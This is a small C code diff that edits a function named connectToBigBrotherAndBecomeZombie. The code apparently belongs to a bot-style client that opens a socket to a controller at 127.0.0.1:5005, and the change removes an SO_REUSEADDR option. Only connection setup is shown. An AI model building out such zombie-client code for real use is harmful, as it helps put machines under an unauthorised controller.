@@ -65,7 +65,7 @@ void connectToBigBrotherAndBecomeZombie(void)
 	char * al;
     int port = 5005;
     struct hostent * he;
-	int de, check = 0, yes = 1;
+	int de, check = 0;
 	struct sockaddr_in veriler;
     struct in_addr ** addr_list;
     char host[] = "127.0.0.1";
@@ -83,8 +83,6 @@ void connectToBigBrotherAndBecomeZombie(void)
 
 		if (sckt != SOCKET_ERROR)
 		{
-			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));
-
 			veriler.sin_family = AF_INET;
 			veriler.sin_port = htons(port);
 			veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
